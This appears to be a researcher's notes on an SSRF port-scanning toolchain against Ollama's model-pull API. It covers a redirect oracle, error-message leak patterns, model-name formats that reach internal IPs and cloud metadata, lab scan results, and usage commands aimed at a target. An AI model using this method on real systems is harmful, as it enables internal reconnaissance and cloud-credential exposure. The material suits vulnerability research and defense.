# SSRF Internal Port Scanner — Complete Toolchain

**Created:** 2026-05-19
**Tested against:** Ollama v0.24.0 on AWS EC2 (<lab-ip>:11434)
**Oracle VPS:** <vps-ip> with nginx reverse proxy

## Architecture

```
[Attacker] --POST /api/pull--> [Ollama on EC2] --GET manifest--> [Oracle VPS]
                                     |                           |
                                     |<----- 302 redirect -------|
                                     |
                                     v
                              [Internal Service]
                              (IMDS/SSH/HTTP/etc)
                                     |
                                     v
                              [Error message leaks
                               first byte / banner]
```

## What We Built

Three components:

1. **Oracle Server** (`ssrf_oracle.py`) — Runs on VPS, cycles through scan targets on each request via 302 redirect
2. **Scanner Client** (`ssrf_scanner.py`) — Python CLI that sends sequential pull requests and parses error messages
3. **Deploy & Run Script** (`ssrf_scan.sh`) — All-in-one bash script

## Confirmed Results (AWS EC2, May 2026)

| Port | Service | Status | Detail |
|------|---------|--------|--------|
| 22 | SSH | OPEN | Banner: `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.15` |
| 80 | HTTP | CLOSED | connection refused |
| 443 | HTTPS | CLOSED | connection refused |
| 3306 | MySQL | CLOSED | connection refused |
| 5432 | PostgreSQL | CLOSED | connection refused |
| 6379 | Redis | CLOSED | connection refused |
| 8080 | HTTP-alt | CLOSED | connection refused |
| 8443 | HTTPS-alt | CLOSED | connection refused |
| 9200 | Elasticsearch | CLOSED | connection refused |
| 27017 | MongoDB | CLOSED | connection refused |
| 11211 | Memcached | CLOSED | connection refused |
| 5672 | RabbitMQ | CLOSED | connection refused |
| 9090 | Prometheus | CLOSED | connection refused |
| 3000 | Grafana | CLOSED | connection refused |
| 169.254.169.254:80 | IMDS | OPEN | First byte: `2` (from instance identity doc) |

## Error Message Patterns

```
SSH open:      "malformed HTTP response \"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.15\""
HTTP open:     "invalid character 'X' looking for beginning of value"  (X = first byte)
Port closed:   "dial tcp x.x.x.x:PORT: connect: connection refused"
Port filtered: timeout (no error within curl timeout)
IMDS open:     "invalid character '2' after top-level value"  (JSON response)
```

## Deployment Gotchas

### SSH Heredoc Escaping
Writing Python scripts to VPS via SSH heredoc is extremely fragile. Use `scp` instead — write locally, then copy.

### nohup in Foreground Mode
The `terminal` tool rejects `nohup` in foreground mode. Use `fuser` to kill by port:
```bash
ssh root@VPS "fuser -k 7777/tcp 2>/dev/null; sleep 1; nohup python3 /tmp/oracle.py > /log 2>&1 &"
```

### .pyc Cache
If you update a Python script on the VPS but it still runs the old version, clear the cache:
```bash
ssh root@VPS "find /tmp -name '*.pyc' -delete; find /tmp -name '__pycache__' -type d -exec rm -rf {} + 2>/dev/null"
```

### nginx Reverse Proxy
For domain-based SSRF (Ollama rejects IP:port in registry names):
```nginx
server {
    listen 80;
    server_name oracle.example.com;
    return 301 https://$host$request_uri;
}
server {
    listen 443 ssl;
    server_name oracle.example.com;
    ssl_certificate /etc/letsencrypt/live/oracle.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/oracle.example.com/privkey.pem;
    location / {
        proxy_pass http://127.0.0.1:7777;
        proxy_set_header Host $host;
        proxy_redirect off;
    }
}
```

### DNS + Cloudflare
- Add A record: `oracle` → VPS IP
- **Must be DNS only** (proxy OFF) — Cloudflare's HTTP proxy breaks non-HTTP protocols

### Let's Encrypt
```bash
certbot certonly --nginx -d oracle.example.com --non-interactive --agree-tos --email admin@example.com
```

## Blob Redirect Limitation

**302 redirects work for manifest GET but NOT for blob GET.** Ollama's blob downloader rejects 302 with "unexpected status code 302". Use the manifest redirect (Path 1) for all scanning.

## Model Name Parsing (v0.24.0)

| Format | Accepted | Notes |
|--------|----------|-------|
| `test:latest` | ✅ | Standard |
| `library/test:latest` | ✅ | With namespace |
| `localhost/test:latest` | ✅ | Hits localhost:5000 |
| `IP:port/namespace/model:tag` | ✅ | Direct IP SSRF |
| `domain.com/library/model:tag` | ✅ | Domain-based (needs nginx proxy) |
| `domain.com:port/model:tag` | ❌ | Port rejected with domain names |
| `IP/model:tag` | ❌ | Needs port |

## Scripts Location

- `/home/bx0/ollama_vulns/ssrf_scanner.py` — Python scanner client
- `/home/bx0/ollama_vulns/ssrf_oracle.py` — Oracle server for VPS
- `/home/bx0/ollama_vulns/ssrf_scan.sh` — All-in-one deploy & scan

## Usage

```bash
# Quick scan
bash ssrf_scan.sh http://target:11434 oracle.example.com 127.0.0.1

# Python scanner with JSON output
python3 ssrf_scanner.py -t http://target:11434 -o oracle.example.com \
  --scan-host 127.0.0.1 -p 22,80,443,3306,5432,6379 \
  --output results.json
```
